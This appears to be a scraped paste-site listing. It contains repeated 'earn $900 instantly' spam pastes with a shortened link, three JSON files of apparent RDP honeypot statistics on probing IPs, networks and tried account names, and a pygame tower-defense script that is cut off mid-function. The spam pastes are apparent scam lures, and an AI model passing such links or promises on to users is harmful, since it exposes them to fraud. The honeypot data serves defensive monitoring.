id,title,username,language,date,content
mR1YdktK,EARN $900 INSTANTLY 2025‚≠ê G8,liamduhking,JavaScript,Monday 14th of April 2025 07:20:17 PM CDT," 
Pdf https://tinyurl.com/privguidee


ZTMPcHzfWc
"
30cCvUkB,2025-04-14_stats.json,rdp_snitch,JSON,Monday 14th of April 2025 07:18:09 PM CDT,"{
  ""ip"": {
    ""156.146.57.113"": 1413,
    ""159.89.6.147"": 651,
    ""88.214.25.121"": 6,
    ""103.47.59.104"": 66,
    ""103.104.73.98"": 15,
    ""71.82.170.60"": 48,
    ""103.118.182.206"": 24,
    ""157.254.25.155"": 24,
    ""216.122.167.129"": 21,
    ""103.180.110.252"": 21,
    ""154.61.77.158"": 9,
    ""211.185.207.14"": 39,
    ""117.88.101.71"": 15,
    ""58.49.220.220"": 18,
    ""45.227.254.151"": 6,
    ""103.180.110.147"": 12,
    ""103.204.22.151"": 9,
    ""36.50.82.250"": 27,
    ""87.106.134.24"": 12,
    ""194.165.17.21"": 51,
    ""154.61.74.81"": 15,
    ""206.217.129.236"": 3,
    ""121.229.189.216"": 6,
    ""117.88.100.113"": 9,
    ""121.229.188.41"": 3,
    ""121.229.191.91"": 9,
    ""121.229.189.80"": 15,
    ""77.237.234.202"": 3,
    ""217.76.49.252"": 3,
    ""156.146.57.47"": 6294,
    ""116.236.69.84"": 15,
    ""198.235.24.212"": 9,
    ""80.94.95.198"": 42,
    ""64.23.144.101"": 3,
    ""158.220.99.53"": 15,
    ""121.229.191.158"": 3,
    ""121.229.191.185"": 3,
    ""185.7.214.16"": 6,
    ""206.217.129.226"": 6,
    ""222.100.239.9"": 3,
    ""87.106.81.118"": 18,
    ""219.139.224.39"": 3,
    ""62.60.188.24"": 3,
    ""154.61.76.145"": 6,
    ""147.185.132.81"": 9,
    ""75.119.150.129"": 3,
    ""80.66.79.30"": 384,
    ""152.42.255.156"": 3,
    ""103.173.99.112"": 21,
    ""36.213.145.109"": 3,
    ""103.241.171.86"": 3,
    ""58.218.199.219"": 12,
    ""205.210.31.90"": 9,
    ""80.94.95.90"": 3,
    ""165.154.12.82"": 3,
    ""194.165.16.161"": 6,
    ""194.165.16.166"": 6,
    ""104.234.11.112"": 3,
    ""92.255.57.86"": 6,
    ""185.7.214.81"": 6,
    ""92.255.85.59"": 3,
    ""198.235.24.71"": 9,
    ""139.180.194.156"": 9
  },
  ""asn"": {
    ""AS212238"": 7707,
    ""AS14061"": 657,
    ""AS35042"": 6,
    ""AS151734"": 225,
    ""AS133296"": 15,
    ""AS20115"": 48,
    ""AS135175"": 30,
    ""AS4766"": 42,
    ""AS134756"": 63,
    ""AS58563"": 18,
    ""AS267784"": 6,
    ""AS8560"": 30,
    ""AS48721"": 63,
    ""AS36352"": 9,
    ""AS51167"": 24,
    ""AS4812"": 15,
    ""AS396982"": 36,
    ""AS204428"": 45,
    ""AS207566"": 21,
    ""AS4134"": 15,
    ""AS215930"": 3,
    ""AS60602"": 384,
    ""AS56046"": 3,
    ""AS132925"": 3,
    ""AS135377"": 3,
    ""AS212477"": 3,
    ""AS20473"": 9
  },
  ""isp"": {
    ""Datacamp Limited"": 7707,
    ""DigitalOcean, LLC"": 657,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Webyne Data Centre Private Limited"": 147,
    ""Web Werks India Pvt. Ltd."": 15,
    ""Charter Communications"": 48,
    ""Internet Utilities NA LLC"": 48,
    ""Geklo Nutricare Private Limited"": 33,
    ""Cogent Communications"": 30,
    ""Korea Telecom"": 42,
    ""China Telecom"": 63,
    ""CHINANET Hubei province network"": 18,
    ""Flyservers S.A."": 69,
    ""IONOS SE"": 30,
    ""HostPapa"": 9,
    ""Contabo GmbH"": 24,
    ""China Telecom (Group)"": 15,
    ""Google LLC"": 36,
    ""SS-Net"": 45,
    ""Chang Way Technologies Co. Limited"": 21,
    ""Chinanet"": 15,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 3,
    ""HYPER-HOSTING"": 384,
    ""China Mobile Communications Group Co., Ltd."": 3,
    ""Ideastack Solutions Private Limited"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""The Constant Company, LLC"": 9
  },
  ""org"": {
    ""Datacamp Limited"": 7707,
    ""DigitalOcean, LLC"": 657,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Racksleaf Networks"": 66,
    ""WEBWERKS"": 15,
    ""Spectrum"": 48,
    ""Gstech Software Systems Pvt Ltd"": 24,
    ""PlayFlare Networks"": 24,
    ""Unknown"": 24,
    ""Geklo Nutricare Private Limited"": 33,
    ""IntechDC"": 30,
    ""Kornet"": 39,
    ""Chinanet JS"": 75,
    ""Chinanet HB"": 18,
    ""Xwin Universal LTD"": 6,
    ""Ipxo"": 9,
    ""Palakitandsecurity"": 27,
    ""De Ber Ionos Cloud Txl"": 30,
    ""Flyservers S.A"": 63,
    ""RackNerd LLC"": 9,
    ""Contabo GmbH"": 21,
    ""Chinanet SH"": 15,
    ""Palo Alto Networks, Inc"": 36,
    ""Unmanaged LTD"": 45,
    ""Chang Way Technologies Co. Limited"": 21,
    ""KORNET"": 3,
    ""UAB Host Baltic"": 3,
    ""Contabo"": 3,
    ""Hyper Hosting SRL"": 384,
    ""SRF"": 21,
    ""China TieTong Telecommunications Corporation"": 3,
    ""Cloudstore"": 3,
    ""Ucloud Information Technology"": 3,
    ""Virtual Machine Solutions LLC"": 3,
    ""TYO Vultr"": 9
  },
  ""regionName"": {
    ""North West"": 7707,
    ""Hesse"": 651,
    ""Kowloon City"": 6,
    ""Uttar Pradesh"": 162,
    ""Maharashtra"": 48,
    ""Wisconsin"": 48,
    ""National Capital Territory of Delhi"": 54,
    ""Sejong-si"": 39,
    ""Jiangsu"": 78,
    ""Shanghai"": 33,
    ""Vilnius"": 6,
    ""Gujarat"": 9,
    ""Land Berlin"": 30,
    ""Kaunas"": 63,
    ""New York"": 9,
    ""North Rhine-Westphalia"": 24,
    ""California"": 39,
    ""Sofia-Capital"": 45,
    ""Moscow"": 21,
    ""Incheon"": 3,
    ""Hubei"": 3,
    ""Tehran"": 3,
    ""Chi\u0219in\u0103u Municipality"": 384,
    ""South West"": 3,
    ""Dubai"": 3,
    ""New Jersey"": 3,
    ""Tokyo"": 9
  },
  ""country"": {
    ""Singapore"": 7710,
    ""Germany"": 705,
    ""Hong Kong"": 6,
    ""India"": 273,
    ""United States"": 99,
    ""South Korea"": 42,
    ""China"": 114,
    ""Lithuania"": 69,
    ""Bulgaria"": 45,
    ""Russia"": 21,
    ""Iran"": 3,
    ""Moldova"": 384,
    ""United Arab Emirates"": 3,
    ""Japan"": 9
  },
  ""account"": {
    ""hello"": 8778,
    ""Test"": 24,
    ""142.93.8.59"": 618,
    ""yqgZIlDat"": 3,
    ""DVSoOo"": 3,
    ""qynYAn"": 3,
    ""Administr"": 24,
    ""NIVUBdFTf"": 3,
    ""APNeEn"": 3,
    ""HgWWen"": 3,
    ""MIKJownEn"": 3,
    ""rfLOId"": 3,
    ""Okuwzs"": 3,
    ""Administrator"": 3,
    ""gFUMAioQf"": 3,
    ""ngpaAi"": 3,
    ""oGInqr"": 3
  },
  ""keyboard"": {
    ""Unknown"": 9483
  },
  ""client_build"": {
    ""Unknown"": 9483
  },
  ""client_name"": {
    ""Unknown"": 9483
  },
  ""ip_type"": {
    ""hosting & proxy"": 7719,
    ""hosting"": 1155,
    ""Unknown"": 573,
    ""proxy"": 33,
    ""mobile"": 3
  }
}"
YrUBrgMw,2025-04-14_stats.json,rdp_snitch,JSON,Monday 14th of April 2025 07:16:17 PM CDT,"{
  ""ip"": {
    ""156.146.57.113"": 942,
    ""159.89.6.147"": 434,
    ""88.214.25.121"": 4,
    ""103.47.59.104"": 44,
    ""103.104.73.98"": 10,
    ""71.82.170.60"": 32,
    ""103.118.182.206"": 16,
    ""157.254.25.155"": 16,
    ""216.122.167.129"": 14,
    ""103.180.110.252"": 14,
    ""154.61.77.158"": 6,
    ""211.185.207.14"": 26,
    ""117.88.101.71"": 10,
    ""58.49.220.220"": 12,
    ""45.227.254.151"": 4,
    ""103.180.110.147"": 8,
    ""103.204.22.151"": 6,
    ""36.50.82.250"": 18,
    ""87.106.134.24"": 8,
    ""194.165.17.21"": 34,
    ""154.61.74.81"": 10,
    ""206.217.129.236"": 2,
    ""121.229.189.216"": 4,
    ""117.88.100.113"": 6,
    ""121.229.188.41"": 2,
    ""121.229.191.91"": 6,
    ""121.229.189.80"": 10,
    ""77.237.234.202"": 2,
    ""217.76.49.252"": 2,
    ""156.146.57.47"": 4196,
    ""116.236.69.84"": 10,
    ""198.235.24.212"": 6,
    ""80.94.95.198"": 28,
    ""64.23.144.101"": 2,
    ""158.220.99.53"": 10,
    ""121.229.191.158"": 2,
    ""121.229.191.185"": 2,
    ""185.7.214.16"": 4,
    ""206.217.129.226"": 4,
    ""222.100.239.9"": 2,
    ""87.106.81.118"": 12,
    ""219.139.224.39"": 2,
    ""62.60.188.24"": 2,
    ""154.61.76.145"": 4,
    ""147.185.132.81"": 6,
    ""75.119.150.129"": 2,
    ""80.66.79.30"": 256,
    ""152.42.255.156"": 2,
    ""103.173.99.112"": 14,
    ""36.213.145.109"": 2,
    ""103.241.171.86"": 2,
    ""58.218.199.219"": 8,
    ""205.210.31.90"": 6,
    ""80.94.95.90"": 2,
    ""165.154.12.82"": 2,
    ""194.165.16.161"": 4,
    ""194.165.16.166"": 4,
    ""104.234.11.112"": 2,
    ""92.255.57.86"": 4,
    ""185.7.214.81"": 4,
    ""92.255.85.59"": 2,
    ""198.235.24.71"": 6,
    ""139.180.194.156"": 6
  },
  ""asn"": {
    ""AS212238"": 5138,
    ""AS14061"": 438,
    ""AS35042"": 4,
    ""AS151734"": 150,
    ""AS133296"": 10,
    ""AS20115"": 32,
    ""AS135175"": 20,
    ""AS4766"": 28,
    ""AS134756"": 42,
    ""AS58563"": 12,
    ""AS267784"": 4,
    ""AS8560"": 20,
    ""AS48721"": 42,
    ""AS36352"": 6,
    ""AS51167"": 16,
    ""AS4812"": 10,
    ""AS396982"": 24,
    ""AS204428"": 30,
    ""AS207566"": 14,
    ""AS4134"": 10,
    ""AS215930"": 2,
    ""AS60602"": 256,
    ""AS56046"": 2,
    ""AS132925"": 2,
    ""AS135377"": 2,
    ""AS212477"": 2,
    ""AS20473"": 6
  },
  ""isp"": {
    ""Datacamp Limited"": 5138,
    ""DigitalOcean, LLC"": 438,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""Webyne Data Centre Private Limited"": 98,
    ""Web Werks India Pvt. Ltd."": 10,
    ""Charter Communications"": 32,
    ""Internet Utilities NA LLC"": 32,
    ""Geklo Nutricare Private Limited"": 22,
    ""Cogent Communications"": 20,
    ""Korea Telecom"": 28,
    ""China Telecom"": 42,
    ""CHINANET Hubei province network"": 12,
    ""Flyservers S.A."": 46,
    ""IONOS SE"": 20,
    ""HostPapa"": 6,
    ""Contabo GmbH"": 16,
    ""China Telecom (Group)"": 10,
    ""Google LLC"": 24,
    ""SS-Net"": 30,
    ""Chang Way Technologies Co. Limited"": 14,
    ""Chinanet"": 10,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 2,
    ""HYPER-HOSTING"": 256,
    ""China Mobile Communications Group Co., Ltd."": 2,
    ""Ideastack Solutions Private Limited"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""The Constant Company, LLC"": 6
  },
  ""org"": {
    ""Datacamp Limited"": 5138,
    ""DigitalOcean, LLC"": 438,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Racksleaf Networks"": 44,
    ""WEBWERKS"": 10,
    ""Spectrum"": 32,
    ""Gstech Software Systems Pvt Ltd"": 16,
    ""PlayFlare Networks"": 16,
    ""Unknown"": 16,
    ""Geklo Nutricare Private Limited"": 22,
    ""IntechDC"": 20,
    ""Kornet"": 26,
    ""Chinanet JS"": 50,
    ""Chinanet HB"": 12,
    ""Xwin Universal LTD"": 4,
    ""Ipxo"": 6,
    ""Palakitandsecurity"": 18,
    ""De Ber Ionos Cloud Txl"": 20,
    ""Flyservers S.A"": 42,
    ""RackNerd LLC"": 6,
    ""Contabo GmbH"": 14,
    ""Chinanet SH"": 10,
    ""Palo Alto Networks, Inc"": 24,
    ""Unmanaged LTD"": 30,
    ""Chang Way Technologies Co. Limited"": 14,
    ""KORNET"": 2,
    ""UAB Host Baltic"": 2,
    ""Contabo"": 2,
    ""Hyper Hosting SRL"": 256,
    ""SRF"": 14,
    ""China TieTong Telecommunications Corporation"": 2,
    ""Cloudstore"": 2,
    ""Ucloud Information Technology"": 2,
    ""Virtual Machine Solutions LLC"": 2,
    ""TYO Vultr"": 6
  },
  ""regionName"": {
    ""North West"": 5138,
    ""Hesse"": 434,
    ""Kowloon City"": 4,
    ""Uttar Pradesh"": 108,
    ""Maharashtra"": 32,
    ""Wisconsin"": 32,
    ""National Capital Territory of Delhi"": 36,
    ""Sejong-si"": 26,
    ""Jiangsu"": 52,
    ""Shanghai"": 22,
    ""Vilnius"": 4,
    ""Gujarat"": 6,
    ""Land Berlin"": 20,
    ""Kaunas"": 42,
    ""New York"": 6,
    ""North Rhine-Westphalia"": 16,
    ""California"": 26,
    ""Sofia-Capital"": 30,
    ""Moscow"": 14,
    ""Incheon"": 2,
    ""Hubei"": 2,
    ""Tehran"": 2,
    ""Chi\u0219in\u0103u Municipality"": 256,
    ""South West"": 2,
    ""Dubai"": 2,
    ""New Jersey"": 2,
    ""Tokyo"": 6
  },
  ""country"": {
    ""Singapore"": 5140,
    ""Germany"": 470,
    ""Hong Kong"": 4,
    ""India"": 182,
    ""United States"": 66,
    ""South Korea"": 28,
    ""China"": 76,
    ""Lithuania"": 46,
    ""Bulgaria"": 30,
    ""Russia"": 14,
    ""Iran"": 2,
    ""Moldova"": 256,
    ""United Arab Emirates"": 2,
    ""Japan"": 6
  },
  ""account"": {
    ""hello"": 5852,
    ""Test"": 16,
    ""142.93.8.59"": 412,
    ""yqgZIlDat"": 2,
    ""DVSoOo"": 2,
    ""qynYAn"": 2,
    ""Administr"": 16,
    ""NIVUBdFTf"": 2,
    ""APNeEn"": 2,
    ""HgWWen"": 2,
    ""MIKJownEn"": 2,
    ""rfLOId"": 2,
    ""Okuwzs"": 2,
    ""Administrator"": 2,
    ""gFUMAioQf"": 2,
    ""ngpaAi"": 2,
    ""oGInqr"": 2
  },
  ""keyboard"": {
    ""Unknown"": 6322
  },
  ""client_build"": {
    ""Unknown"": 6322
  },
  ""client_name"": {
    ""Unknown"": 6322
  },
  ""ip_type"": {
    ""hosting & proxy"": 5146,
    ""hosting"": 770,
    ""Unknown"": 382,
    ""proxy"": 22,
    ""mobile"": 2
  }
}"
PFJSyG4K,2025-04-14_stats.json,rdp_snitch,JSON,Monday 14th of April 2025 07:15:08 PM CDT,"{
  ""ip"": {
    ""156.146.57.113"": 471,
    ""159.89.6.147"": 217,
    ""88.214.25.121"": 2,
    ""103.47.59.104"": 22,
    ""103.104.73.98"": 5,
    ""71.82.170.60"": 16,
    ""103.118.182.206"": 8,
    ""157.254.25.155"": 8,
    ""216.122.167.129"": 7,
    ""103.180.110.252"": 7,
    ""154.61.77.158"": 3,
    ""211.185.207.14"": 13,
    ""117.88.101.71"": 5,
    ""58.49.220.220"": 6,
    ""45.227.254.151"": 2,
    ""103.180.110.147"": 4,
    ""103.204.22.151"": 3,
    ""36.50.82.250"": 9,
    ""87.106.134.24"": 4,
    ""194.165.17.21"": 17,
    ""154.61.74.81"": 5,
    ""206.217.129.236"": 1,
    ""121.229.189.216"": 2,
    ""117.88.100.113"": 3,
    ""121.229.188.41"": 1,
    ""121.229.191.91"": 3,
    ""121.229.189.80"": 5,
    ""77.237.234.202"": 1,
    ""217.76.49.252"": 1,
    ""156.146.57.47"": 2098,
    ""116.236.69.84"": 5,
    ""198.235.24.212"": 3,
    ""80.94.95.198"": 14,
    ""64.23.144.101"": 1,
    ""158.220.99.53"": 5,
    ""121.229.191.158"": 1,
    ""121.229.191.185"": 1,
    ""185.7.214.16"": 2,
    ""206.217.129.226"": 2,
    ""222.100.239.9"": 1,
    ""87.106.81.118"": 6,
    ""219.139.224.39"": 1,
    ""62.60.188.24"": 1,
    ""154.61.76.145"": 2,
    ""147.185.132.81"": 3,
    ""75.119.150.129"": 1,
    ""80.66.79.30"": 128,
    ""152.42.255.156"": 1,
    ""103.173.99.112"": 7,
    ""36.213.145.109"": 1,
    ""103.241.171.86"": 1,
    ""58.218.199.219"": 4,
    ""205.210.31.90"": 3,
    ""80.94.95.90"": 1,
    ""165.154.12.82"": 1,
    ""194.165.16.161"": 2,
    ""194.165.16.166"": 2,
    ""104.234.11.112"": 1,
    ""92.255.57.86"": 2,
    ""185.7.214.81"": 2,
    ""92.255.85.59"": 1,
    ""198.235.24.71"": 3,
    ""139.180.194.156"": 3
  },
  ""asn"": {
    ""AS212238"": 2569,
    ""AS14061"": 219,
    ""AS35042"": 2,
    ""AS151734"": 75,
    ""AS133296"": 5,
    ""AS20115"": 16,
    ""AS135175"": 10,
    ""AS4766"": 14,
    ""AS134756"": 21,
    ""AS58563"": 6,
    ""AS267784"": 2,
    ""AS8560"": 10,
    ""AS48721"": 21,
    ""AS36352"": 3,
    ""AS51167"": 8,
    ""AS4812"": 5,
    ""AS396982"": 12,
    ""AS204428"": 15,
    ""AS207566"": 7,
    ""AS4134"": 5,
    ""AS215930"": 1,
    ""AS60602"": 128,
    ""AS56046"": 1,
    ""AS132925"": 1,
    ""AS135377"": 1,
    ""AS212477"": 1,
    ""AS20473"": 3
  },
  ""isp"": {
    ""Datacamp Limited"": 2569,
    ""DigitalOcean, LLC"": 219,
    ""NOC EMAIL: noc@one-host.net"": 2,
    ""Webyne Data Centre Private Limited"": 49,
    ""Web Werks India Pvt. Ltd."": 5,
    ""Charter Communications"": 16,
    ""Internet Utilities NA LLC"": 16,
    ""Geklo Nutricare Private Limited"": 11,
    ""Cogent Communications"": 10,
    ""Korea Telecom"": 14,
    ""China Telecom"": 21,
    ""CHINANET Hubei province network"": 6,
    ""Flyservers S.A."": 23,
    ""IONOS SE"": 10,
    ""HostPapa"": 3,
    ""Contabo GmbH"": 8,
    ""China Telecom (Group)"": 5,
    ""Google LLC"": 12,
    ""SS-Net"": 15,
    ""Chang Way Technologies Co. Limited"": 7,
    ""Chinanet"": 5,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 1,
    ""HYPER-HOSTING"": 128,
    ""China Mobile Communications Group Co., Ltd."": 1,
    ""Ideastack Solutions Private Limited"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""The Constant Company, LLC"": 3
  },
  ""org"": {
    ""Datacamp Limited"": 2569,
    ""DigitalOcean, LLC"": 219,
    ""ThinkTech Technology Industrial CO. Limited"": 2,
    ""Racksleaf Networks"": 22,
    ""WEBWERKS"": 5,
    ""Spectrum"": 16,
    ""Gstech Software Systems Pvt Ltd"": 8,
    ""PlayFlare Networks"": 8,
    ""Unknown"": 8,
    ""Geklo Nutricare Private Limited"": 11,
    ""IntechDC"": 10,
    ""Kornet"": 13,
    ""Chinanet JS"": 25,
    ""Chinanet HB"": 6,
    ""Xwin Universal LTD"": 2,
    ""Ipxo"": 3,
    ""Palakitandsecurity"": 9,
    ""De Ber Ionos Cloud Txl"": 10,
    ""Flyservers S.A"": 21,
    ""RackNerd LLC"": 3,
    ""Contabo GmbH"": 7,
    ""Chinanet SH"": 5,
    ""Palo Alto Networks, Inc"": 12,
    ""Unmanaged LTD"": 15,
    ""Chang Way Technologies Co. Limited"": 7,
    ""KORNET"": 1,
    ""UAB Host Baltic"": 1,
    ""Contabo"": 1,
    ""Hyper Hosting SRL"": 128,
    ""SRF"": 7,
    ""China TieTong Telecommunications Corporation"": 1,
    ""Cloudstore"": 1,
    ""Ucloud Information Technology"": 1,
    ""Virtual Machine Solutions LLC"": 1,
    ""TYO Vultr"": 3
  },
  ""regionName"": {
    ""North West"": 2569,
    ""Hesse"": 217,
    ""Kowloon City"": 2,
    ""Uttar Pradesh"": 54,
    ""Maharashtra"": 16,
    ""Wisconsin"": 16,
    ""National Capital Territory of Delhi"": 18,
    ""Sejong-si"": 13,
    ""Jiangsu"": 26,
    ""Shanghai"": 11,
    ""Vilnius"": 2,
    ""Gujarat"": 3,
    ""Land Berlin"": 10,
    ""Kaunas"": 21,
    ""New York"": 3,
    ""North Rhine-Westphalia"": 8,
    ""California"": 13,
    ""Sofia-Capital"": 15,
    ""Moscow"": 7,
    ""Incheon"": 1,
    ""Hubei"": 1,
    ""Tehran"": 1,
    ""Chi\u0219in\u0103u Municipality"": 128,
    ""South West"": 1,
    ""Dubai"": 1,
    ""New Jersey"": 1,
    ""Tokyo"": 3
  },
  ""country"": {
    ""Singapore"": 2570,
    ""Germany"": 235,
    ""Hong Kong"": 2,
    ""India"": 91,
    ""United States"": 33,
    ""South Korea"": 14,
    ""China"": 38,
    ""Lithuania"": 23,
    ""Bulgaria"": 15,
    ""Russia"": 7,
    ""Iran"": 1,
    ""Moldova"": 128,
    ""United Arab Emirates"": 1,
    ""Japan"": 3
  },
  ""account"": {
    ""hello"": 2926,
    ""Test"": 8,
    ""142.93.8.59"": 206,
    ""yqgZIlDat"": 1,
    ""DVSoOo"": 1,
    ""qynYAn"": 1,
    ""Administr"": 8,
    ""NIVUBdFTf"": 1,
    ""APNeEn"": 1,
    ""HgWWen"": 1,
    ""MIKJownEn"": 1,
    ""rfLOId"": 1,
    ""Okuwzs"": 1,
    ""Administrator"": 1,
    ""gFUMAioQf"": 1,
    ""ngpaAi"": 1,
    ""oGInqr"": 1
  },
  ""keyboard"": {
    ""Unknown"": 3161
  },
  ""client_build"": {
    ""Unknown"": 3161
  },
  ""client_name"": {
    ""Unknown"": 3161
  },
  ""ip_type"": {
    ""hosting & proxy"": 2573,
    ""hosting"": 385,
    ""Unknown"": 191,
    ""proxy"": 11,
    ""mobile"": 1
  }
}"
MeAAjrd8,Make $1000 15-MINUTES  (BEGINNER) HV,liamduhking,JavaScript,Monday 14th of April 2025 07:06:53 PM CDT," 
Pdf https://tinyurl.com/privguidee


9nTwCcGtLi
"
67PNrkT4,EARN $900 INSTANTLY 2025 2U,liamduhking,JavaScript,Monday 14th of April 2025 06:53:27 PM CDT," 
Pdf https://tinyurl.com/privguidee


tBLTYYjxGx
"
dZEDJn2y,tower_def_game.py,nitestryker,Python,Monday 14th of April 2025 06:51:04 PM CDT,"# A Primitive Example of a tower defense game similar to clash royale written in pygame 
# click on the grid to place objects that will find the nearest enemy tower 

import pygame 
import sys
import os
import math
import random
import heapq  # For A* pathfinding

# Initialize pygame
pygame.init()

# Constants
GRID_SIZE = 18  # Increased from 15 to 18 for more play area
CELL_SIZE = 35  # Slightly smaller cells to fit on screen
MARGIN = 4
WINDOW_SIZE = (GRID_SIZE * (CELL_SIZE + MARGIN) + MARGIN, 
               GRID_SIZE * (CELL_SIZE + MARGIN) + MARGIN)

# Colors
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
GRAY = (200, 200, 200)
GREEN = (0, 255, 0)
BLUE = (100, 100, 255)
RED = (255, 100, 100)
YELLOW = (255, 255, 100)
PURPLE = (200, 100, 255)
RIVER_BLUE = (80, 170, 255)
LIGHT_GRASS = (140, 200, 100)
DARK_GRASS = (120, 180, 80)
BRIDGE_BROWN = (150, 100, 50)

# Create the grid
grid = [[0 for _ in range(GRID_SIZE)] for _ in range(GRID_SIZE)]

# Create river position (horizontal line in middle of the grid)
river_row_start = 8  # Adjusted for larger grid
river_row_end = 10   # Making river slightly wider (2 rows)

# Define bridge positions (aligned with princess towers)
left_bridge_col = 3  # Left bridge aligned with left princess towers
right_bridge_col = 13  # Right bridge adjusted for wider grid
bridge_width = 2  # Width of each bridge

# Define tower placement areas - TOP (Player 1 side)
# Main tower (Top): Centered in the grid, 3x3
tower1_top_x, tower1_top_y = 8, 1  # King tower position
tower1_top_size = 3

# Princess towers (Top): On each side of the main tower, one row down from king tower
tower2_top_x, tower2_top_y = 3, 2  # Left princess tower (one row down from king tower)
tower2_top_size = 2
tower3_top_x, tower3_top_y = 13, 2  # Right princess tower (one row down from king tower)
tower3_top_size = 2

# Define tower placement areas - BOTTOM (Player 2 side)
# Main tower (Bottom): Centered in the grid, 3x3
tower1_bottom_x, tower1_bottom_y = 8, 14  # King tower position
tower1_bottom_size = 3

# Princess towers (Bottom): On each side of the main tower, aligned with king tower top
tower2_bottom_x, tower2_bottom_y = 3, 14  # Left princess tower (aligned with king tower top)
tower2_bottom_size = 2
tower3_bottom_x, tower3_bottom_y = 13, 14  # Right princess tower (aligned with king tower top)
tower3_bottom_size = 2

# Create separate lists to store different tower positions
king_tower_positions = []
princess_tower_positions = []
blue_tower_positions = []  # To track our own towers for pathfinding

# Add king tower positions (red)
for row in range(tower1_top_y, tower1_top_y + tower1_top_size):
    for col in range(tower1_top_x, tower1_top_x + tower1_top_size):
        king_tower_positions.append((row, col))

# Add princess tower positions (red)
for row in range(tower2_top_y, tower2_top_y + tower2_top_size):
    for col in range(tower2_top_x, tower2_top_x + tower2_top_size):
        princess_tower_positions.append((row, col))

for row in range(tower3_top_y, tower3_top_y + tower3_top_size):
    for col in range(tower3_top_x, tower3_top_x + tower3_top_size):
        princess_tower_positions.append((row, col))

# Add blue tower positions (used to prevent placement and for pathfinding)
# King tower (blue)
for row in range(tower1_bottom_y, tower1_bottom_y + tower1_bottom_size):
    for col in range(tower1_bottom_x, tower1_bottom_x + tower1_bottom_size):
        blue_tower_positions.append((row, col))

# Princess towers (blue)
for row in range(tower2_bottom_y, tower2_bottom_y + tower2_bottom_size):
    for col in range(tower2_bottom_x, tower2_bottom_x + tower2_bottom_size):
        blue_tower_positions.append((row, col))

for row in range(tower3_bottom_y, tower3_bottom_y + tower3_bottom_size):
    for col in range(tower3_bottom_x, tower3_bottom_x + tower3_bottom_size):
        blue_tower_positions.append((row, col))
        
# Combine all red tower positions (will be used for display purposes)
red_tower_positions = king_tower_positions + princess_tower_positions

# Troop class to handle movement and rendering
class Troop:
    def __init__(self, row, col, color=(0, 0, 255)):
        self.row = row
        self.col = col
        # Store position as floats for smooth movement
        self.exact_x = col
        self.exact_y = row
        self.color = color
        self.path = []
        self.speed = 1.0  # Cells per second
        self.size = CELL_SIZE - 10
        self.active = True
        
        # Find path to nearest red tower
        self.find_path()
    
    def find_path(self):
        """"""Find path to nearest red tower using A* pathfinding""""""
        # First check if princess towers are still available
        if princess_tower_positions:
            # Find closest princess tower
            closest_princess = min(princess_tower_positions, 
                                  key=lambda t: math.sqrt((self.row - t[0])**2 + (self.col - t[1])**2))
            princess_dist = math.sqrt((self.row - closest_princess[0])**2 + 
                                     (self.col - closest_princess[1])**2)
            
            # Find closest king tower
            closest_king = min(king_tower_positions, 
                              key=lambda t: math.sqrt((self.row - t[0])**2 + (self.col - t[1])**2))
            king_dist = math.sqrt((self.row - closest_king[0])**2 + 
                                 (self.col - closest_king[1])**2)
            
            # Choose the closer of the two
            if princess_dist <= king_dist + 2:  # Slight preference for princess towers
                target = closest_princess
                print(""Targeting princess tower at"", target)
            else:
                target = closest_king
                print(""Targeting king tower at"", target)
        else:
            # All princess towers destroyed, target king tower
            target = min(king_tower_positions, 
                        key=lambda t: math.sqrt((self.row - t[0])**2 + (self.col - t[1])**2))
            print(""No princess towers left, targeting king tower at"", target)
        
        # A* pathfinding - include blue towers as obstacles to path around
        self.path = astar_pathfinding((self.row, self.col), target, include_blue_towers=True)
        
        if not self.path:
            print(""No path found!"")
            self.active = False
        else:
            # Remove the starting position from the path
            if self.path and len(self.path) > 0:
                self.path.pop(0)
    
    def update(self, dt):
        """"""Update troop position""""""
        if not self.active or not self.path:
            return
        
        # Get the next position to move toward
        next_pos = self.path[0]
        
        # Calculate direction
        dx = next_pos[1] - self.exact_x
        dy = next_pos[0] - self.exact_y
        
        # Normalize direction if not 0
        distance = math.sqrt(dx**2 + dy**2)
        if distance > 0:
            dx /= distance
            dy /= distance
        
        # Move towards the next position
        move_distance = self.speed * dt
        if distance <= move_distance:
            # We've reached the next position
            self.exact_x = next_pos[1]
            self.exact_y = next_pos[0]
            self.path.pop(0)
            
            # Check if we've reached the target
            if not self.path:
                print(""Reached target!"")
                self.active = False
        else:
            # Move towards the next position
            self.exact_x += dx * move_distance
            self.exact_y += dy * move_distance
        
        # Update integer position
        self.row = int(self.exact_y)
        self.col = int(self.exact_x)
    
    def draw(self, screen):
        """"""Draw the troop on the screen""""""
        if not self.active:
            return
            
        # Calculate screen position
        x = self.exact_x * (CELL_SIZE + MARGIN) + MARGIN + CELL_SIZE // 2
        y = self.exact_y * (CELL_SIZE + MARGIN) + MARGIN + CELL_SIZE // 2
        
        # Draw the troop
        pygame.draw.circle(screen, self.color, (int(x), int(y)), self.size // 2)
        
        # Add a border
        pygame.draw.circle(screen, (0, 0, 200), (int(x), int(y)), self.size // 2, 2)

# Pathfinding functions
def is_valid_cell(row, col, include_blue_towers=False):
    """"""Check if a cell is valid for pathfinding""""""
    # Check if within grid bounds
    if not (0 <= row < GRID_SIZE and 0 <= col < GRID_SIZE):
        return False
    
    # Check if it's a river (not a bridge)
    if river_row_start <= row < river_row_end:
        is_bridge = ((left_bridge_col <= col < left_bridge_col + bridge_width) or 
                   (right_bridge_col <= col < right_bridge_col + bridge_width))
        if not is_bridge:
            return False
    
    # Check if it's a blue tower position (only for pathfinding, not for placement)
    if include_blue_towers and (row, col) in blue_tower_positions:
        return False
    
    return True

def get_neighbors(node, include_blue_towers=False):
    """"""Get valid neighboring cells for pathfinding""""""
    row, col = node
    neighbors = []
    
    # Check all 4 adjacent cells
    directions = [(0, 1), (1, 0), (0, -1), (-1, 0)]
    for dr, dc in directions:
